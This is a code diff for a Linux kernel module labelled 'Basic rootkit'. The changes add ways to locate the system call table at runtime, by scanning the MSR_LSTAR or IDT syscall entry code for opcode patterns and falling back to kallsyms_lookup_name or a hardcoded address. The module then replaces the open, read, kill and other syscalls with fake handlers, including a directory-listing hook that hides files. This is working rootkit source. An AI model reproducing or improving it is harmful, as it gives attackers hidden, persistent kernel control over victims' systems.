@@ -14,8 +14,7 @@ MODULE_AUTHOR("Antoine Rouquette");
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("Basic rootkit");
 
-#define SYS_CALL_TABLE_ADDR 0xffffffff97200220
-#define KALLSYMS_PATH       "/proc/kallsyms"
+#define SYS_CALL_TABLE_ADDR 0xffffffffa5200220
 #define FILE_PATH           "/tmp/hack"
 #define FILE_PATH_SIZE      9
 #define FILE_BASENAME       "hack"
@@ -50,7 +49,7 @@ struct linux_dirent
 };
 
 //How to find the syscall address and not in hardcoded
-unsigned long * sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;
+unsigned long * sys_call = NULL;
 
 // Original functions
 asmlinkage int (*original_sys_open) (const char *pathname, int flags);
@@ -60,6 +59,77 @@ asmlinkage int (*original_sys_kill) (pid_t pid, int sig);
 asmlinkage pid_t (*original_sys_getpid) (void);
 asmlinkage pid_t (*original_sys_getppid) (void);
 asmlinkage ssize_t (*original_sys_read) (int fd, void *buf, size_t count); 
+
+
+void *memmem(const void *haystack, size_t haystack_size, const void *needle, size_t needle_size)
+{
+	char *p;
+
+	for(p = (char *)haystack; p <= ((char *)haystack - needle_size + haystack_size); p++)
+		if(memcmp(p, needle, needle_size) == 0)
+			return (void *)p;
+
+	return NULL;
+}
+
+#ifdef __x86_64__
+
+unsigned long *find_sys_call_table(void)
+{
+	unsigned long sct_off = 0;
+	unsigned char code[512];
+	char **p;
+
+	printk("[%s] x86_64 sycall", __this_module.name);
+
+	rdmsrl(MSR_LSTAR, sct_off);
+	memcpy(code, (void *)sct_off, sizeof(code));
+
+	printk("[%s] MSR_LSTAR : %s", __this_module.name, code);
+
+	p = (char **)memmem(code, sizeof(code), "\xff\x14\xc5", 3);
+
+	if(p) {
+		unsigned long *table = *(unsigned long **)((char *)p + 3);
+		table = (unsigned long *)(((unsigned long)table & 0xffffffff) | 0xffffffff00000000);
+		return table;
+	}
+	return NULL;
+}
+
+#else
+
+struct {
+	unsigned short limit;
+	unsigned long base;
+} __attribute__ ((packed))idtr;
+
+struct {
+	unsigned short off1;
+	unsigned short sel;
+	unsigned char none, flags;
+	unsigned short off2;
+} __attribute__ ((packed))idt;
+
+unsigned long *find_sys_call_table(void) {
+	char **p;
+	unsigned long sct_off = 0;
+	unsigned char code[255];
+
+	printk("[%s] x86 sycall", __this_module.name);
+
+	asm("sidt %0":"=m" (idtr));
+	memcpy(&idt, (void *)(idtr.base + 8 * 0x80), sizeof(idt));
+	sct_off = (idt.off2 << 16) | idt.off1;
+	memcpy(code, (void *)sct_off, sizeof(code));
+
+	p = (char **)memmem(code, sizeof(code), "\xff\x14\x85", 3);
+
+	if(p) return *(unsigned long **)((char *)p + 3);
+	else return NULL;
+}
+
+#endif
 
 /*  
  * File system, one layer deep into kernel
@@ -275,7 +345,7 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
     char 					* buf;
     char 					d_type;
     char 					logs[LOGS_SIZE];
-    struct linux_dirent *	dir;		
+    struct linux_dirent *	dir			= NULL;
     struct linux_dirent *	prev		= NULL;
     int						nread		= 0;
     pid_t					pid		    = original_sys_getpid();
@@ -344,6 +414,24 @@ asmlinkage int fake_sys_getdents(unsigned int fd, struct linux_dirent *dirp, uns
 
 static int __init lkm_init(void)
 {
+	sys_call = (unsigned long *)find_sys_call_table();
+
+	if(!sys_call)
+	{
+		sys_call = (unsigned long *)kallsyms_lookup_name("sys_call_table");
+		if(!sys_call)
+		{
+			sys_call = (unsigned long *)SYS_CALL_TABLE_ADDR;
+			printk("[%s] hardcoded sys_call_table : 0x%p.\n", __this_module.name, sys_call);
+		}
+		else
+		{
+			printk("[%s] 2.sys_call_table : 0x%p.\n", __this_module.name, sys_call);
+		}
+	}
+	else
+		printk("[%s] 1.sys_call_table found : 0x%p.\n", __this_module.name, sys_call);
+
     original_sys_open      	= sys_call[__NR_open];
     original_sys_read      	= sys_call[__NR_read];
     original_sys_close      = sys_call[__NR_close];
@@ -359,7 +447,6 @@ static int __init lkm_init(void)
     sys_call[__NR_kill] 	= fake_sys_kill;
     write_cr0(read_cr0() | (0x10000));
     printk(KERN_INFO "[%s] module loaded.\n", __this_module.name);
-    printk("[%s] hardcoded syscall table address : 0x%p.\n", __this_module.name, sys_call);
     return 0;
 }
 
